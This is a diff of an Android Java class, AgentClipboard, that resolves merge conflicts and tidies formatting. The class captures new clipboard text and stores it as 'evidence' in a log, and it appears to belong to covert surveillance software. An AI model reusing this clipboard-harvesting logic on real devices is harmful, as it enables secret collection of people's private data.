@@ -26,18 +26,12 @@ import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
 public class AgentClipboard extends AgentBase implements IncrementalLog {
-<<<<<<< HEAD
+
 	private static final String TAG = "AgentClipboard"; //$NON-NLS-1$
 
 	ClipboardManager clipboardManager;
 	static String lastClip = ""; //$NON-NLS-1$
-=======
-	private static final String TAG = "AgentClipboard";
 
-	ClipboardManager clipboardManager;
-	static String lastClip = "";
->>>>>>> devel
-	
 	LogR logIncremental;
 
 	@Override
@@ -45,11 +39,7 @@ public class AgentClipboard extends AgentBase implements IncrementalLog {
 		logIncremental = new LogR(EvidenceType.CLIPBOARD);
 		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
 		if (Cfg.DEBUG) {
-<<<<<<< HEAD
 			Check.ensures(clipboardManager != null, "Null clipboard manager"); //$NON-NLS-1$
-=======
-			Check.ensures(clipboardManager != null, "Null clipboard manager");
->>>>>>> devel
 		}
 	}
 
@@ -71,7 +61,7 @@ public class AgentClipboard extends AgentBase implements IncrementalLog {
 		final String ret = clipboardManager.getText().toString();
 		if (ret != null && !ret.equals(lastClip)) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): captured " + ret) ;//$NON-NLS-1$
+				Check.log(TAG + " (go): captured " + ret);//$NON-NLS-1$
 			}
 			saveEvidence(ret);
 			lastClip = ret;
@@ -93,18 +83,14 @@ public class AgentClipboard extends AgentBase implements IncrementalLog {
 		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
 
 		if (Cfg.DEBUG) {
-<<<<<<< HEAD
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
-=======
-			Check.asserts(logIncremental != null, "null log");
->>>>>>> devel
 		}
 		logIncremental.write(items);
 
 	}
 
 	public void resetLog() {
-		if(logIncremental.hasData()){
+		if (logIncremental.hasData()) {
 			logIncremental.close();
 			logIncremental = new LogR(EvidenceType.CLIPBOARD);
 		}
